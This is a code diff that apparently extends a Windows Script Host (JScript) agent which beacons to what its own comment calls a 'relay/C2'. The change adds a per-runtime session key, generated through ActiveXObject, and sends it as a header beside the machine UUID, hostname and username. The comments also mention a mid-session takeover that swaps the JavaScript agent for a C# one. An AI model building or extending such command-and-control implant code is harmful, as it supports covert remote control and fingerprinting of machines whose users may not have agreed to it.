@@ -181,6 +181,26 @@ function runAgent() {
         // for every machine where detection failed.
         return GUID_RE.test(guid) ? guid : '';
     }
+    function makeSessionKey() {
+        // A RANDOM per-RUNTIME key — NOT identity. A fresh value on every process launch
+        // (kept in this closure, sent on every beacon) so the relay/C2 can tell agent
+        // RUNTIMES apart on one machine: the machine uuid above stays THE identity rows
+        // are keyed by; the session key distinguishes concurrent or succeeding processes
+        // (an UpgradeNetFramework takeover swaps it JS→C# mid-session). CoCreateGuid via
+        // Scriptlet.TypeLib; the Math.random fallback only needs uniqueness, not
+        // unpredictability — the key identifies, it authorizes nothing.
+        try {
+            var guid = ('' + new ActiveXObject('Scriptlet.TypeLib').GUID).toLowerCase();
+            guid = guid.replace(/[{}]/g, '');
+            if (GUID_RE.test(guid)) return guid;
+        } catch (e) {}
+        var hex = '0123456789abcdef', key = '';
+        for (var i = 0; i < 36; i++) {
+            if (i == 8 || i == 13 || i == 18 || i == 23) key += '-';
+            else key += hex.charAt(Math.floor(Math.random() * 16));
+        }
+        return key;
+    }
     function buildIdentity() {
         var guid = loadGuid();
         var archMap = { AMD64: 'x86_64', x86: 'i386', ARM64: 'aarch64' };
@@ -218,6 +238,7 @@ function runAgent() {
         ];
         function addHeader(name, value) { if (value) headers.push([name, '' + value]); }
         addHeader('X-Agent-Machine-Uuid', guid);
+        addHeader('X-Agent-Session-Key', makeSessionKey());
         addHeader('X-Agent-Hostname', readEnv('COMPUTERNAME'));
         addHeader('X-Agent-Username', readEnv('USERNAME'));
         addHeader('X-Agent-Arch', arch);
